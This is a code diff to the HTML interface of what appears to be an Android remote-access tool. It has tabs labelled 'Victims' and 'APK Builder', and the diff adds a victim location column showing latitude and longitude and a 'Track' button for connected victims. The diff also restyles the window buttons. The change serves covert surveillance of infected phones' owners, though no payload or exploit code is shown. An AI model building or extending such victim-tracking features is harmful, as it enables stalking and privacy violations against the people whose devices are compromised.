@@ -37,9 +37,9 @@
     <div class="ui top attached tabular menu" style="margin: 0; flex-shrink: 0; border-radius: 0;">
         <a class="item active notDraggable" data-tab="first">Victims</a>
         <a class="item notDraggable" data-tab="second">APK Builder</a>
-        <div class="ui right mini text menu notDraggable" style="margin: 0; margin-right: 10px;">
-            <button class="ui circular orange button" ng-click="minimize()" title="Minimize" style="font-size: 14px; height: 25px; width: 25px; padding: 0; margin: 5px; display: flex; align-items: center; justify-content: center;">−</button>
-            <button class="ui circular red button" ng-click="close()" title="Close" style="font-size: 14px; height: 25px; width: 25px; padding: 0; margin: 5px; display: flex; align-items: center; justify-content: center;">✕</button>
+        <div class="ui right mini text menu notDraggable" style="margin: 0;">
+            <button class="ui circular orange button" ng-click="minimize()" style="font-size: 8px; height: 20px; width: 20px; padding: 0; margin: 5px;"></button>
+            <button class="ui circular red button" ng-click="close()" style="font-size: 8px; height: 20px; width: 20px; padding: 0; margin: 5px;"></button>
         </div>
     </div>
     <div class="ui bottom attached tab segment active notDraggable" data-tab="first" style="flex: 1; overflow: auto; margin: 0; border-radius: 0; padding: 10px; border-top: none;">
@@ -81,6 +81,7 @@
                                 <th>Release</th>
                                 <th>IP</th>
                                 <th>Port</th>
+                                <th>Location</th>
                                 <th></th>
                             </tr>
                         </thead>
@@ -96,6 +97,11 @@
                                 <td ng-bind="victim.release"></td>
                                 <td ng-bind="victim.ip"></td>
                                 <td ng-bind="victim.port"></td>
+                                <td>
+                                    <span ng-if="victim.locationEnabled && victim.lat != null && victim.lng != null">{{ victim.lat | number:4 }}, {{ victim.lng | number:4 }}</span>
+                                    <span ng-if="!victim.locationEnabled || victim.lat == null">—</span>
+                                    <a ng-if="victim.socket" class="ui mini violet button" ng-click="openLabToLocation(key)" style="margin-left:4px;"><i class="marker icon"></i>Track</a>
+                                </td>
                                 <td></td>
                             </tr>
 
